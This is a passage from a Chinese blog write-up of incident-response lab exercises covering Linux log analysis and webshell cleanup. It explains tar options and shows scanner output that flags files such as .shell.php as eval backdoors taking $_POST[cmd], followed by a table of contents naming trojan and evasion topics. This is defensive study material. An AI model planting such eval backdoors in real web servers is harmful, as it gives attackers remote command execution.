<li><code>-v</code>: 选项表示详细模式（verbose）。在处理文件的过程中，会将每个被归档的文件名显示在终端上，让用户了解正在处理哪些文件。</li>
<li><code>-f html.tar.gz</code>: 选项中的 <code>-f</code> 用于指定输出归档文件的名称。在这个例子中，生成的压缩归档文件将被命名为 <code>html.tar.gz</code>。</li>
<li><code>./</code>: 这是指定要归档的文件或目录路径。在这个例子中，<code>./</code> 表示归档当前目录下的所有文件和目录。</li>
</ul>
<p>以入侵排查为例，我们扫描出来的结果就是</p>
<p>id      级别  大小       CRC        修改时间             文件 (说明)</p>
<hr>
<p> 00001   4     88         70B2B130   21-01-01 08:00:01    .shell.php    『Eval后门 {参数:$_POST[cmd]}』 _</p>
<p>00002   4     24         F46D132A   23-08-03 10:15:23    \1.php         『Eval后门 {参数:$_POST[1]}』</p>
<p>00003   1     655360     A3580725   23-08-03 10:45:11    \html\1.tar         『可疑文件』 </p>
<p>00004   1     722        17D041A4   23-08-03 10:40:18    \html\index.php     『可疑文件』</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">0x02正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.0.1.</span> <span class="toc-text">第一章 应急响应-Linux日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFLinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">什么是Linux日志分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">常见日志文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.0.1.3.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.0.1.4.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.0.1.4.1.</span> <span class="toc-text">连接主机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-%E6%9F%A5%E7%9C%8B%E6%9C%89%E5%A4%9A%E5%B0%91IP%E5%9C%A8%E7%88%86%E7%A0%B4%E4%B8%BB%E6%9C%BAssh%E7%9A%84root%E5%B8%90%E5%8F%B7"><span class="toc-number">2.0.1.4.2.</span> <span class="toc-text">问题1:查看有多少IP在爆破主机ssh的root帐号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-ssh%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F%E7%99%BB%E9%99%86%E7%9A%84IP%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-number">2.0.1.4.3.</span> <span class="toc-text">问题2:ssh爆破成功登陆的IP是多少</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%983-%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D%E5%AD%97%E5%85%B8%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.0.1.4.4.</span> <span class="toc-text">问题3:爆破用户名字典是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D%E5%AD%97%E5%85%B8"><span class="toc-number">2.0.1.4.4.1.</span> <span class="toc-text">什么是爆破用户名字典</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95-root-%E7%94%A8%E6%88%B7%E7%9A%84-ip-%E4%B8%80%E5%85%B1%E7%88%86%E7%A0%B4%E4%BA%86%E5%A4%9A%E5%B0%91%E6%AC%A1"><span class="toc-number">2.0.1.4.5.</span> <span class="toc-text">问题4:成功登录 root 用户的 ip 一共爆破了多少次</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%985-%E9%BB%91%E5%AE%A2%E7%99%BB%E9%99%86%E4%B8%BB%E6%9C%BA%E5%90%8E%E6%96%B0%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%EF%BC%8C%E7%94%A8%E6%88%B7%E5%90%8D%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-number">2.0.1.4.6.</span> <span class="toc-text">问题5:黑客登陆主机后新建了一个后门用户，用户名是多少</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80"><span class="toc-number">2.0.2.</span> <span class="toc-text">第一章 应急响应-webshell查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFwebshell"><span class="toc-number">2.0.2.1.</span> <span class="toc-text">什么是webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFwebshell%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">2.0.2.2.</span> <span class="toc-text">什么是webshell应急响应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%80"><span class="toc-number">2.0.2.3.</span> <span class="toc-text">常规后门查杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webshell%E4%BB%A3%E7%A0%81%E7%89%B9%E5%BE%81"><span class="toc-number">2.0.2.4.</span> <span class="toc-text">webshell代码特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-1"><span class="toc-number">2.0.2.5.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-%E9%BB%91%E5%AE%A2webshell%E9%87%8C%E9%9D%A2%E7%9A%84flag"><span class="toc-number">2.0.2.5.1.</span> <span class="toc-text">问题1:黑客webshell里面的flag</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C-%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E7%9A%84shell"><span class="toc-number">2.0.2.5.2.</span> <span class="toc-text">问题二:黑客使用的什么工具的shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%983-%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8Fshell%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84"><span class="toc-number">2.0.2.5.3.</span> <span class="toc-text">问题3:黑客隐藏shell的完整路径</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ls%E5%92%8Cls-a%E5%92%8Cls-l%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.0.2.5.3.1.</span> <span class="toc-text">ls和ls -a和ls -l的区别</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E9%A9%AC%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84"><span class="toc-number">2.0.2.5.4.</span> <span class="toc-text">问题4:黑客免杀马完整路径</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%8D%E6%9D%80%E9%A9%AC"><span class="toc-number">2.0.2.5.4.1.</span> <span class="toc-text">什么是免杀马</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF"><span class="toc-number">2.0.2.5.4.2.</span> <span class="toc-text">常见的免杀技术</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%92%8C%E5%A4%84%E7%90%86%E5%85%8D%E6%9D%80%E9%A9%AC%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9B"><span class="toc-number">2.0.2.5.4.3.</span> <span class="toc-text">查找和处理免杀马的方法；</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#windows%E4%B8%8A%E7%9A%84%E7%BD%91%E7%AB%99%E6%97%A5%E5%BF%97%E8%B7%AF%E5%BE%84"><span class="toc-number">2.0.2.5.4.4.</span> <span class="toc-text">windows上的网站日志路径</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%92%8C%E5%88%86%E6%9E%90%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-number">2.0.2.5.4.5.</span> <span class="toc-text">如何查看和分析日志文件？</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E7%A1%AE%E8%AE%A4%E6%98%AF%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-number">2.0.2.5.4.6.</span> <span class="toc-text">为什么可以确认是恶意文件？</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">2.0.3.</span> <span class="toc-text">第一章 应急响应- Linux入侵排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.0.3.1.</span> <span class="toc-text">什么是木马?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%EF%BC%9A"><span class="toc-number">2.0.3.2.</span> <span class="toc-text">检测：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFlinux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">2.0.3.3.</span> <span class="toc-text">什么是linux入侵排查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E7%9A%84%E5%A5%BD%E5%A4%84"><span class="toc-number">2.0.3.4.</span> <span class="toc-text">两种方法的好处</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-2"><span class="toc-number">2.0.3.5.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-web%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%9C%A8%E9%A9%AC%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%88%B0%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AF%86%E7%A0%81%E6%8F%90%E4%BA%A4"><span class="toc-number">2.0.3.5.1.</span> <span class="toc-text">问题1:web目录存在木马，请找到木马的密码提交</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.0.3.6.</span> <span class="toc-text">一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%96%91%E4%BC%BC%E5%AD%98%E5%9C%A8%E4%B8%8D%E6%AD%BB%E9%A9%AC%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%88%B0%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9A%84%E5%AF%86%E7%A0%81%E6%8F%90%E4%BA%A4"><span class="toc-number">2.0.3.6.1.</span> <span class="toc-text">问题2:服务器疑似存在不死马，请找到不死马的密码提交</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-number">2.0.3.7.</span> <span class="toc-text">什么是不死马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%983-%E4%B8%8D%E6%AD%BB%E9%A9%AC%E6%98%AF%E9%80%9A%E8%BF%87%E5%93%AA%E4%B8%AA%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90%E7%9A%84%EF%BC%8C%E8%AF%B7%E6%8F%90%E4%BA%A4%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">2.0.3.7.1.</span> <span class="toc-text">问题3:不死马是通过哪个文件生成的，请提交文件名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%984%EF%BC%9A%E9%BB%91%E5%AE%A2%E7%95%99%E4%B8%8B%E4%BA%86%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%87%BA%E9%BB%91%E5%AE%A2%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8ip%E6%8F%90%E4%BA%A4"><span class="toc-number">2.0.3.7.2.</span> <span class="toc-text">问题4：黑客留下了木马文件，请找出黑客的服务器ip提交</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netstat-%E5%91%BD%E4%BB%A4"><span class="toc-number">2.0.3.8.</span> <span class="toc-text">netstat 命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%985%E9%BB%91%E5%AE%A2%E7%95%99%E4%B8%8B%E4%BA%86%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%87%BA%E9%BB%91%E5%AE%A2%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%90%AF%E7%9A%84%E7%9B%91%E7%AB%AF%E5%8F%A3%E6%8F%90%E4%BA%A4"><span class="toc-number">2.0.3.8.1.</span> <span class="toc-text">问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%E5%8F%B7%EF%BC%9F"><span class="toc-number">2.0.3.9.</span> <span class="toc-text">什么是监听端口号？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%8E%92%E6%9F%A5"><span class="toc-number">2.0.4.</span> <span class="toc-text">工具排查</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=玄机第一章应急响应(二刷已完)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第一章应急响应(二刷已完)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=玄机第一章应急响应(二刷已完)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=玄机第一章应急响应(二刷已完)&body=Check out this article: https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第一章应急响应(二刷已完)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第一章应急响应(二刷已完)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第一章应急响应(二刷已完)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第一章应急响应(二刷已完)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=玄机第一章应急响应(二刷已完)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=玄机第一章应急响应(二刷已完)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        wanTh3flag
        <br>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">H0me</a></li><!--
                --><!--
                --><li><a href="/about/">A6out</a></li><!--
                --><!--
                --><li><a href="/tags/">T6gs</a></li><!--
                --><!--
                --><li><a href="/categories/">Catagory</a></li><!--
                --><!--
                --><li><a href="/links/">L1nks</a></li><!--
                --><!--
                --><li><a href="/search/">s4arch</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
